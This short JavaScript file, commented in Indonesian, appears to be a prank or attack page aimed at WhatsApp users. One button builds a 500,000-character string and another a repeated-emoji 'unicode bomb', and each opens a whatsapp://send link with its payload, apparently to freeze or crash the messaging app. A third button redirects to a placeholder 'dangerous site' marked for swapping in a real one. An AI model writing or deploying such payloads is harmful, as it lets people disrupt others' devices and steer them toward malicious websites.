document.getElementById('string-panjang').addEventListener('click', function() {
    const longString = "A".repeat(500000); // String super panjang
    const whatsappLink = "whatsapp://send?text=" + encodeURIComponent(longString);
    window.location.href = whatsappLink;
});

document.getElementById('unicode-bomb').addEventListener('click', function() {
    // Kombinasi karakter Unicode yang bikin pusing
    const unicodeString = "\uD83D\uDE00".repeat(1000);
    const whatsappLink = "whatsapp://send?text=" + encodeURIComponent(unicodeString);
    window.location.href = whatsappLink;
});

document.getElementById('redirect-link').addEventListener('click', function() {
    // Link redirect ke situs yang berbahaya (CONTOH!)
    const redirectURL = "https://example.com/bahaya"; // GANTI INI!
    window.location.href = redirectURL;
});